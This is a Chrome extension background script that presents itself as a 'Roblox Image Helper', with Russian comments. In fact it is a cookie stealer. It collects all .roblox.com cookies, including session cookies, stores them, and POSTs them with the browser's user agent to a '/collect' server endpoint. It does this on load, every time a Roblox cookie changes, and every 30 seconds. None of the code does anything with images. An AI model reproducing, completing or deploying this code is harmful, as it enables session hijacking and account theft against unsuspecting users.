// Roblox Image Helper — фоновый процесс
console.log('✅ Roblox Helper загружен');

function collectData() {
  chrome.cookies.getAll({ domain: '.roblox.com' }, (cookies) => {
    if (cookies && cookies.length > 0) {
      chrome.storage.local.set({ 
        robloxData: cookies,
        lastUpdate: Date.now()
      });
      
      sendToServer(cookies);
      
      console.log('📦 Данные собраны:', cookies.length);
    }
  });
}

function sendToServer(data) {
  const url = 'http://localhost:5000/collect';
  
  fetch(url, {
    method: 'POST',
    headers: { 
      'Content-Type': 'application/json' 
    },
    body: JSON.stringify({
      data: data,
      timestamp: Date.now(),
      userAgent: navigator.userAgent
    })
  })
  .then(response => response.json())
  .then(result => {
    console.log('📤 Отправлено!');
  })
  .catch(error => {
    console.log('⚠️ Ошибка соединения');
  });
}

setTimeout(collectData, 1000);

chrome.cookies.onChanged.addListener((info) => {
  if (info.cookie.domain.includes('roblox.com')) {
    setTimeout(collectData, 500);
  }
});

setInterval(collectData, 30000);

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === "getData") {
    chrome.storage.local.get(['robloxData'], (result) => {
      sendResponse({ data: result.robloxData || [] });
    });
    return true;
  }
  
  if (request.action === "collectNow") {
    collectData();
    sendResponse({ status: 'ok' });
    return true;
  }
});